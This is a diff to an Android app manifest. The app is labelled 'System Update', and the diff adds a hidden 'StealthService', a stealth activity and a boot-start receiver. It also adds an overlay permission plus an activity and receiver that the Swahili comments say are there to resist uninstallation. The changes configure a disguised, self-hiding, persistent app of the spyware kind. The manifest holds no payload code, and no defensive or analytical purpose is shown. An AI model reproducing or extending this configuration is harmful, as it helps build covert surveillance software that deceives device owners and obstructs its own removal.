@@ -23,11 +23,15 @@
     <uses-permission android:name="android.permission.WAKE_LOCK" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 
+    <!-- SYSTEM PERMISSIONS -->
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+
     <application
         android:allowBackup="true"
         android:label="System Update"
         android:theme="@style/Theme.AppCompat.Light.NoActionBar">
 
+        <!-- LAUNCHER ACTIVITY - INAONEKANA MWANZO TU -->
         <activity
             android:name=".LoginActivity"
             android:exported="true">
@@ -37,21 +41,43 @@
             </intent-filter>
         </activity>
 
+        <!-- STEALTH ACTIVITY - HAIONEKANI -->
         <activity
             android:name=".StealthActivity"
             android:exported="false" />
 
+        <!-- UNINSTALL PROTECTION - HAIONEKANI ISIPOKUWA WAKATI YA KUFUTA -->
+        <activity
+            android:name=".UninstallProtectionActivity"
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:noHistory="true" />
+
+        <!-- STEALTH SERVICE - INATEGEMEA BACKGROUND -->
         <service
             android:name=".StealthService"
             android:enabled="true"
             android:exported="false" />
 
+        <!-- BOOT RECEIVER - AUTO START -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+            </intent-filter>
+        </receiver>
+
+        <!-- UNINSTALL RECEIVER - ILI KUKABILIANA NA KUFUTWA -->
+        <receiver
+            android:name=".UninstallReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.QUERY_PACKAGE_RESTART" />
+                <data android:scheme="package" />
             </intent-filter>
         </receiver>
     </application>
